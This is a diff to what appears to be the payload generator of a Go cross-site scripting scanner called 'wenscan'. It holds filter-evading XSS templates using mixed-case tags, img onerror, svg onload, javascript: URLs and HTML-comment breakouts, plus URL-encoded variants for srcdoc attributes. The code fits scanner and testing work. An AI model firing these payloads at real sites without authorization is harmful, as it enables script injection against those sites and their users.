@@ -4,7 +4,10 @@ import (
 	"fmt"
 	"math/rand"
 	"net/url"
+	"strings"
 	"time"
+	"wenscan/Helper"
+	log "wenscan/Log"
 
 	"github.com/thoas/go-funk"
 )
@@ -37,14 +40,11 @@ func RandStringRunes(n int) string {
 
 var (
 	script_payload string = "<ScRiPt>%s</sCrIpT>"
-	//JaVaScRiPt_payload string = "<ScRiPt>JaVaScRiPt:var %s</sCrIpT>"
 	img_payload    string = "<iMg SrC=1 oNeRrOr=%s>"
 	href_payload   string = "<a HrEf=JaVaScRiPt:%s>cLiCk</A>"
 	svg_payload    string = "<sVg/OnLoAd=%s>"
 	iframe_payload string = "<IfRaMe SrC=jAvAsCrIpT:%s>"
 	input_payload  string = "<input autofocus onfocus=%s>"
-	// style_payload   string = "expression(a(%s))"
-	// payload3_prompt string = "prompt(1)"
 )
 
 var (
@@ -54,6 +54,11 @@ var (
 	flag_Attibutes1 string = "'%s=prompt(1)'"
 	flag_Attibutes2 string = "\"%s=prompt(1)\""
 	flag_Attibutes3 string = " %s=prompt(1) "
+)
+
+var (
+	comment_payload1 string = "--><%s>"
+	comment_payload2 string = "--!><%s>"
 )
 
 type Generator struct {
@@ -75,6 +80,28 @@ func (g *Generator) Value() interface{} {
 	return g.value
 }
 
+//CheckHtmlNodeAttributesKey 检测是否存在对应的key值
+func CheckHtmlNodeAttributesKey(s Helper.Occurence, key string) bool {
+	c := funk.Map(*s.Details.Attributes, func(A Helper.Attribute) bool {
+		if A.Key == key {
+			return true
+		}
+		return false
+	})
+	if funk.Contains(c, true) {
+		return true
+	}
+	return false
+}
+
+func Test_CheckHtmlNodeAttributesKey() {
+	detail := Helper.Node{Tagname: "attibute", Content: "key", Attributes: &[]Helper.Attribute{{Key: "srcdoc", Val: "dsadsadadsa"}}}
+	test := Helper.Occurence{Details: detail}
+	if CheckHtmlNodeAttributesKey(test, "srcdoc") {
+		log.Debug("ok")
+	}
+}
+
 //GeneratorPayload 生成payload
 func (g *Generator) GeneratorPayload(mode int, flag string, extension interface{}) string {
 	if htmlmode == mode {
@@ -87,7 +114,7 @@ func (g *Generator) GeneratorPayload(mode int, flag string, extension interface{
 			}
 		}
 	} else if comment == mode {
-		commentpayload := []string{script_payload}
+		commentpayload := []string{comment_payload1, comment_payload2}
 		g.words = append(g.words, commentpayload...)
 		if !g.Next() {
 			switch s := g.Value().(type) {
@@ -97,8 +124,9 @@ func (g *Generator) GeneratorPayload(mode int, flag string, extension interface{
 		}
 	} else if attibute == mode {
 		switch s := extension.(type) {
-		case string:
-			if funk.Contains(s, "key") {
+		case Helper.Occurence:
+
+			if funk.Contains(s.Type, "key") {
 				KeyPayload := []string{script_payload, img_payload, href_payload, svg_payload, iframe_payload, input_payload}
 				g.words = append(g.words, KeyPayload...)
 				if !g.Next() {
@@ -107,7 +135,26 @@ func (g *Generator) GeneratorPayload(mode int, flag string, extension interface{
 						return fmt.Sprintf(v, flag)
 					}
 				}
-			} else if funk.Contains(s, "value") {
+			} else if funk.Contains(s.Type, "value") {
+				if CheckHtmlNodeAttributesKey(s, "srcdoc") {
+					//替换'<'和'>'为 url 编码
+					ValuePayload := []string{script_payload, img_payload, href_payload, svg_payload, iframe_payload, input_payload}
+					newValuePayload := funk.Map(ValuePayload, func(payload string) string {
+						Lstr := strings.Replace(payload, "<", "%26lt;", -1)
+						Rstr := strings.Replace(Lstr, ">", "%26gt;", -1)
+						return Rstr
+					})
+					switch v := newValuePayload.(type) {
+					case []string:
+						g.words = append(g.words, v...)
+						if !g.Next() {
+							switch v := g.Value().(type) {
+							case string:
+								return fmt.Sprintf(v, flag)
+							}
+						}
+					}
+				}
 				ValuePayload := []string{flag_tag1, flag_tag2, flag_tag3, flag_Attibutes1, flag_Attibutes2, flag_Attibutes3}
 				g.words = append(g.words, ValuePayload...)
 				if !g.Next() {
